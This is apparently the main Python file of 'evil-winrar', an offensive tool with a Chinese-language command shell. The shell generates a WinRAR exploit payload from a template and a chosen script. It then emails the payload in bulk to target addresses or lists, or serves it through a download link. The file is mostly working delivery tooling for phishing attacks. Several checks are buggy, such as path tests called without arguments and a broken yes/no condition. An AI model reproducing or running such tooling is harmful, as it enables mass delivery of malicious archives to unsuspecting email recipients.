from cmd import Cmd
from typing import IO
from src.generate import generate_exp 
import os
from src.sendemail import EmailClient
from src.httpserver import http_server_main
import configparser
from src.lib.colorprint import Color,cprint
from src.edit import edition


conf = configparser.ConfigParser()
conf.read(r"D:\开发系列\开发练习\安全开发2\evil-winrar\config\config.ini")
# print(conf.sections())

commond_help = """ 
help : 列出帮助
generate : 该模块能够生成payload
sendmail : 该模块能够通过邮件发送payload
httpserver : 该模块能够生成一个带有payload的下载链接
edit : 编辑配置文件
exit : 退出shell
 """

class terminal(Cmd):
    def __init__(self, completekey: str = "tab", stdin: IO[str] | None = None, stdout: IO[str] | None = None) -> None:
        super().__init__(completekey, stdin, stdout)
        Cmd.prompt = "evil-winrar> "
        Cmd.intro = cprint("evil-winrar shell \n"+commond_help,style=Color.RED,isstr=True)

        self.undoc_header="evil-winrar commands"
    def default(self, line: str) -> None:
        self.prompt = cprint(f"evil-winrar> ",style=Color.PURPLE,isstr=True)
        print("无效命令,请输入help或?获取帮助")
        return super().default(line)
    
    def emptyline(self) -> bool:
        self.prompt = cprint(f"evil-winrar> ",style=Color.PURPLE,isstr=True)
        print("无效命令,请输入help或?获取帮助")
        return super().emptyline()

    def precmd(self, line: str) -> str:
        if line == "?":
            line = "help"
        self.prompt = cprint(f"{line}> ",style=Color.PURPLE,isstr=True)
        return super().precmd(line)

    def do_help(self, arg: str) -> bool | None:
        print("hello")
        return super().do_help(arg)
    
    def do_generate(self,arg:str):
        self.prompt = cprint(f"generate> ",style=Color.PURPLE,isstr=True)
        # print("请输入你的模板文件路径")
        # base_file_path = input("generate> 模板文件路径:")
        # print("请输入你想执行脚本的路径")
        # script_file_path = input("generate> 脚本文件的路径路径:")
        # print("请输入你想保存exp的路径:")
        # save_file_path = input("generate> 保存exp的路径:")
        while True:
            print("请输入你的模板文件路径")
            base_file_path = input("generate> 模板文件路径:")
            if os.path.exists(base_file_path):
                if os.path.isfile():
                    break
                else:
                    print("该路径不是文件,请重新输入")
            else:
                print("该路径文件不存在,请重新输入")
            print("请输入你想执行脚本的路径")
            script_file_path = input("generate> 脚本文件的路径路径:")
            if os.path.exists(script_file_path):
                if os.path.isfile():
                    break
                else:
                    print("该路径不是文件,请重新输入")
            else:
                print("该路径文件不存在,请重新输入")
            print("请输入你想保存exp的路径:")
            save_file_path = input("generate> 保存exp的路径:")
            if os.path.exists(save_file_path):
                if os.path.isfile():
                    break
                else:
                    print("该路径不是文件,请重新输入")
            else:
                print("该路径文件不存在,请重新输入")
        generate_exp(base_file_path,script_file_path,save_file_path=save_file_path)
        

    def do_sendmail(self,arg:str):          
        self.prompt = cprint(f"sendmail> ",style=Color.PURPLE,isstr=True)
        input_prefix = cprint("sendmail> ",style=Color.PURPLE,isstr=True)
        print("是否按配置文件的内容进行初始化")
        client = query_smtp_start()

        print("""  
            请选择输入邮件文本设置方式
            1. 自己填写
            2. 输入准备好的邮件文本路径
            99. 退出
            """)
        query_num = int(input(f"{input_prefix}请输入选项[1,2,99]: "))
        query_smtp_payload_text(client,query_num)

        print(""" 
            请选择payload
              1. 输入payload路径
              2. 生成一个新的payload
              99.退出
             """)
        query_num = int(input(f"{input_prefix}请输入选项[1,2,99]: "))


        print(""" 
            请选择输入发送目标的的方式
              1. 给指定目标发送邮件
              2. 给多个目标发送邮件
              3. 按名单向目标发送邮件
              99. 退出
            """)
        
        query_num = int(input(f"{input_prefix}请输入选项[1,2,3,99]: "))
        query_smtp_send(client,num=query_num)
        
        pass

    def do_httpserver(self,arg:str):           
        self.prompt = cprint(f"httpserver> ",style=Color.PURPLE,isstr=True)
        print("开启下载服务器")
        http_server_main()

    def do_edit(self,arg):
        from src.edit import edition
        # print(os.getcwd())
        edition()
    
    def do_exit(self,arg):
        os._exit(1)

def query_smtp_start():
    conf_ok = input("请输入(YES/NO) > ").lower()
    if conf_ok != "yes" or conf_ok != "no":
        print("输入不符合要求,请重新输入")
        if conf_ok == "no":
            print("请输入邮箱服务器地址")
            host = input("host是:")
            print("请输入邮箱服务器地址的端口")
            host_port = input("邮箱服务器地址的端口是:")
            print("请输入个人邮箱地址")
            from_addr = input("个人邮箱地址:")
            print("请输邮箱服务器密码(授权码)")
            from_passwd = input("邮箱服务器密码(授权码):")
            client = EmailClient(host,host_port,from_addr,from_passwd)
            return client
        else:
            host = conf.get('smtp-conf','smtp-host')
            host_port = conf.get('smtp-conf','smtp-host-port')
            from_addr = conf.get('smtp-conf','personal-email')
            from_passwd = conf.get('smtp-conf','personal-smtp-passwd')
            # print(f"""
            #     初始化结果如下: 
            #     host:{host}
            #     host_post:{host_port}
            #     from_addr:{from_addr}
            #     from_passwd:{from_passwd}
            #      """)
            client = EmailClient(host,host_port,from_addr,from_passwd)
            return client
    else:
        query_smtp_start()


def query_smtp_payload_text(client:EmailClient,query_num):
    while True: 
        if query_num == 1:
            subject = input("请输入邮件文本内容: ")
            client.do_content(Subject=subject)
            break
        elif query_num == 2:
            subject_file = input("请输入准备好的邮件文本路径: ")
            client.do_content(file=subject_file)
            break
        elif query_num == 99:
            exit()
        else:
            print("输入的不是有效选项,请重新输入") 
            query_num = int(input("输入的不是有效选项,请重新输入: "))
    

def query_smtp_payload(client:EmailClient,num):
    while True:
        if num == 1:
            payload_path = input("请输入payload的路径: ")
            if os.path.exists(payload_path):
                if os.path.isfile(payload_path):
                    raw_payload_name = os.path.basename(payload_path)
                    payload_name = input(f"请输入payload的名字,默认为{raw_payload_name}: ")
                    if payload_name == '':
                        payload_name = raw_payload_name
                    client.set_file(payload_path,payload_name)
                    break
                else:
                    payload_path=input("该路径不是一个文件,请重新输入: ")
            else:
                payload_path=input("该路径不存在,请重新输入")
        if num == 2:
            print("请输入你的模板文件路径")
            base_file_path = input("模板文件路径:")
            print("请输入你想执行脚本的路径")
            script_file_path = input("脚本文件的路径路径")
            print("请输入你想保存exp的路径")
            save_file_path = input("保存exp的路径")
            payload_path = generate_exp(base_file_path,script_file_path,save_file_path=save_file_path)
            if os.path.exists(payload_path):
                if os.path.isfile(payload_path):
                    raw_payload_name = os.path.basename(payload_path)
                    payload_name = input(f"请输入payload的名字,默认为{raw_payload_name}: ")
                    if payload_name == '':
                        payload_name = raw_payload_name
                    client.set_file(payload_path,payload_name)

def query_smtp_send(client:EmailClient,num:int):
    while True:
        if isinstance(num,int):
            if num == 1:
                addr = input("请输入目标邮件地址: ")
                client.send_one(addr)
                break

            elif num == 2:
                addrs = input("请输入多个目标邮件地址,按 , 隔开: ").split(",")
                client.send_everyone(addrs)
                break

            elif num == 3:
                while True:
                    addrs_path = input("请输入名单路径: ")
                    if os.path.exists("addrs_path"):
                        if os.path.isfile(addrs_path):
                            client.filelist_send(addrs_path)
                            break
                        else:
                            print("该路径不是文件,请重新输入")
                    else:
                        print("该路径不存在,请重新输入")
                break

            elif num == 99:
                exit("成功退出")

            else:
                print("请输入有效的选项")

        else:
            print("请输入对应的数字")
        num = int(input("请重新输入选项:"))

                        

if __name__ == "__main__":
    try:
        terminal().cmdloop()
    except KeyboardInterrupt as e:
        print(e)
        exit()